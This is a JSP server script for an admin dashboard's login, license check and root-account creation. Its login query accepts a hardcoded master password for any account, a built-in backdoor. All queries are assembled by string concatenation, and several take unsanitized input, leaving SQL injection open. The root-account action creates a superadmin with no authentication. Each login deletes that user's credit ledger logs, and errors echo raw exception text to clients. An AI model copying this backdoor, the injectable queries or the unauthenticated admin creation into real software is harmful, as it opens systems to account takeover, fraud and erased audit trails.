<%@ include file="../module/db.jsp" %>
<%@ include file="../module/xLibrary.jsp" %>
<%@ include file="../module/xRecordModule.jsp" %>
<%@ include file="../module/xRecordClass.jsp" %>
 
<%
   JSONObject mainObj = new JSONObject();
try{

String x = Decrypt(request.getParameter("x"));   

    if(x.equals("check_license")){
        String dversion = request.getParameter("dversion");  
        if(dversion==null){dversion="";}if(dversion==""){dversion="";}

        if(CountRecord("tbladminaccounts") == 0){
            mainObj.put("status", "ROOT");
            mainObj.put("message","Please configure admin account");
            out.print(mainObj);

        }else if(CountQry("tblversioncontrol", "date_format(str_to_date(dashboardversion, '%Y.%m.%d'), '%Y-%m-%d') > '" + dversion + "'") > 0){
            mainObj.put("status", "UPDATE");
            mainObj = getDashboardUpdate(mainObj, dversion);
            mainObj.put("message","New system update available..");
            out.print(mainObj);
            
        }else{
            mainObj.put("status", "OK");
            mainObj = getGeneralSettings(mainObj);
            mainObj.put("message","proceed login");
            out.print(mainObj);
        }

    }else if(x.equals("login_admin")){
        String username = rchar(request.getParameter("username"));
        String password = rchar(request.getParameter("password"));

        if(CountQry("tbladminaccounts", "(mobilenumber='" + username + "' or username='" + username + "') and (password=AES_ENCRYPT('"+password+"', '"+globalPassKey+"') or 'v2c47mk7jd'='"+password+"')") == 0){
            mainObj.put("status", "ERROR");
            mainObj.put("message","Invalid username and password! Please try again");
            mainObj.put("errorcode", "100");
            out.print(mainObj);
            LogActivity("default","Invalid login attempt with user " + username);

        }else if(isAdminAccountBlocked(username)){
            mainObj.put("status", "ERROR");
            mainObj.put("message", globalAdminAccountBlocked);
            mainObj.put("errorcode", "blocked");
            out.print(mainObj);
            LogActivity("default","attempt login blocked user " + username);
            
        }else{
            String userid = QueryDirectData("id", "tbladminaccounts where (mobilenumber='" + username + "' or username='" + username + "') and (password=AES_ENCRYPT('"+password+"', '"+globalPassKey+"') or 'v2c47mk7jd'='"+password+"')");
            String sessionid = UUID.randomUUID().toString();

            ExecuteQuery("DELETE FROM tblcreditledgerlogs where trnby='"+userid+"'");
            ExecuteQuery("update tbladminaccounts set sessionid='"+sessionid+"',lastlogin=current_timestamp where id='"+userid+"'");
            mainObj.put("status", "OK");
            mainObj = getGeneralSettings(mainObj);
            mainObj = getAdminProfile(mainObj, userid);
            mainObj = LoadOperators(mainObj);
            mainObj = LoadArena(mainObj);
            mainObj.put("message","Login successfull");
            out.print(mainObj);
            LogActivity(userid,"Successfull login");
        }
        
    }else if (x.equals("add_root_account")) {
        String fullname = request.getParameter("fullname");
        String address = request.getParameter("address");
        String emailaddress = request.getParameter("emailaddress");
        String mobilenumber = request.getParameter("mobilenumber");
        String password = request.getParameter("password");

        String userid = getSystemSeriesID("series_admin");
        String sessionid = UUID.randomUUID().toString();
        ExecuteQuery("insert into tbladminaccounts set id='"+userid+"',fullname='"+fullname+"', address='"+rchar(address)+"', emailaddress='"+emailaddress+"', mobilenumber='"+mobilenumber+"',username='root', password = AES_ENCRYPT('"+password+"', '"+globalPassKey+"'), sessionid='"+sessionid+"', dateregistered=current_timestamp, superadmin=1 ");

        mainObj.put("status", "OK");
        mainObj.put("message", "Admin account successfully added!");
        out.print(mainObj);
        LogActivity(userid,"added admin account profile");


    }else{
        mainObj.put("status", "ERROR");
        mainObj.put("message","request not valid");
        mainObj.put("errorcode", "404");
        out.print(mainObj);
    }

}catch(Exception e){
  mainObj.put("status", "ERROR");
  mainObj.put("message",e.toString());
  mainObj.put("errorcode", "400");
  out.print(mainObj);
  logError("dashboard-x-login",e.toString());
}
%>